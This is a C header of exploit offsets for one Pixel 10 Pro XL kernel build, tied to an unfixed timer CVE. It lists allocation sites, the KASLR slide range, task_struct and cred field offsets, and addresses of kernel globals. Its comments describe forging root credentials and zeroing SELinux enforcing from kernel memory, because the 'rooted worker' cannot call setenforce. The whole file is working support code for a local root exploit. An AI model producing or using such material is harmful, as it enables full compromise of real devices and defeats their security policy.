/* Pixel 10 Pro XL (mustang), stock CP3A.261005.005, build 16252310.
 * Kernel 6.6.127-android15-8-g91d825611104-ab16252310-4k, 4 KiB pages.
 * Symbols and allocation return sites: artifacts/mustang/vmlinux_4k.elf
 * (BTF struct layouts + disassembly of do_timer_create / prepare_creds /
 * copy_process). CVE-2026-98260 is unfixed here: the posixtimer_exec
 * cleanup only landed in 6.6.158+.
 * Do not reuse this profile for another kernel, even with the same KMI.
 */
#ifndef PIXEL_TIMER_OFFSETS_H
#define PIXEL_TIMER_OFFSETS_H
#define TARGET_RELEASE "6.6.127-android15-8-g91d825611104-ab16252310-4k"
#define TARGET_DEVICE "mustang"
#define PAGE 4096UL
#define TRACE_CPUS 8
/* do_timer_create+0xa4: bl kmem_cache_alloc(posix_timers_cache), return +4. */
#define STATIC_TIMER_SITE 0xffffffc080195bacULL
#define TIMER_ALLOC 0x108ULL
/* sizeof(struct cred) = 0xb8, cred_jar object_size = 0xc0. */
#define CRED_REQ 0xb8ULL
#define CRED_ALLOC 0xc0ULL
/* prepare_creds+0x20: bl kmem_cache_alloc(cred_jar), return +4. */
#define CRED_SITE_STATIC 0xffffffc0800e4094ULL
/* copy_process+0x13c: bl kmem_cache_alloc_node(task_struct_cachep), return +4. */
#define TASK_SITE_STATIC 0xffffffc0800ab8bcULL
/* KASLR (CONFIG_ARM64_VA_BITS_39): __pi_kaslr_early_init computes the image
 * seed as (rnd & 0x1fffffffff) + 2^36 and __primary_switch rounds it down to
 * a 2MB boundary, so the runtime slide lies in [2^36, 3*2^36). */
#define KASLR_MIN_SLIDE 0x1000000000ULL
#define KASLR_MAX_SLIDE 0x3000000000ULL
#define KASLR_SLIDE_ALIGN 0x1fffffULL
/* task_struct_cachep object_size from /proc/slabinfo (4800). */
#define TASK_ALLOC_BYTES 0x12c0ULL
/* struct task_struct: cred @0x820, loginuid @0x8e0, posix_cputimers
 * @0x778; the three queue leftmosts are bases[i].tqhead.rb_leftmost. */
#define OFF_TASK_CRED 0x820ULL
#define OFF_TASK_LOGINUID 0x8e0ULL
#define OFF_TQ_LEFTMOST_0 0x788ULL
#define OFF_TQ_LEFTMOST_1 0x7a0ULL
#define OFF_TQ_LEFTMOST_2 0x7b8ULL
/* 6.6 cred layout: usage(8) uid 0x8 gid 0xc suid 0x10 sgid 0x14
 * euid 0x18 egid 0x1c fsuid 0x20 fsgid 0x24; caps 0x30..0x50;
 * security 0x80 user 0x88 user_ns 0x90 ucounts 0x98 group_info 0xa0. */
#define CRED_UID_OFF 8ULL
/* selinux_state.enforcing is byte 0; the preceding 8-byte symbol is
 * avc_latest_notif_update.notif_lock, so zeroing state-7 clears enforcing
 * while leaving initialized (+1) intact.  The rooted worker cannot call
 * setenforce: the fake cred's SELinux blob does not apply to the shell
 * domain on this build, so permissive has to be set from the kernel side. */
#define SELINUX_STATE_STATIC 0xffffffc08237a0e8ULL
#define SELINUX_ENFORCE_ZAP (SELINUX_STATE_STATIC - 7ULL)
#define PANIC_ON_WARN_STATIC 0xffffffc08212ac0cULL
#define ROOT_USER_STATIC 0xffffffc08214efe0ULL
#define INIT_USER_NS_STATIC 0xffffffc08214ed50ULL
#define INIT_UCOUNTS_STATIC 0xffffffc082150ab0ULL
#define INIT_GROUPS_STATIC 0xffffffc082150540ULL
#define SELINUX_BLOB_OFF 0ULL
#define SELINUX_SID_KERNEL 1U
#define FULLCAP 0x1ffffffffffULL
#endif
